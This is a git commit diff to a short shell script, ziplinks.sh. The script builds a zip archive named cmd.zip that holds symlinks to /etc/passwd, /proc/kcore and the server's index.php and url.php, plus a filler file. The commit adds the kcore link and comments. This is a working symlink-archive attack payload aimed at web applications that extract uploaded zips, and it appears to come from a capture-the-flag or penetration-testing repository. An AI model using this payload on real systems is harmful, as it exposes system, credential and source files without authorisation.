d0111bddb0eab90ef51c3a8e02881e8fda6c7b74
test <test@example.com>
2017-12-28 17:22:48 +0100

    ten

--- ziplinks.sh
+++ ziplinks.sh
@@ -1,17 +1,19 @@
 #!/bin/bash
 
+# file cannot be too small
 for i in `seq 1 50`
 do
     echo bullsh1t >> testfile.txt
 done
 
-echo "Test" > INDEX
-echo "Test" > URL
-
+# add symlinks 
 ln -s /etc/passwd passwd
 ln -s ../../index.php index
 ln -s ../../url.php url
+ln -s /proc/kcore kcore
 
-zip --symlinks cmd.zip testfile.txt passwd index url
+# zip stuff
+zip --symlinks cmd.zip testfile.txt passwd index url kcore
 
-rm passwd index url testfile.txt
+# cleanup
+rm passwd index url kcore testfile.txt
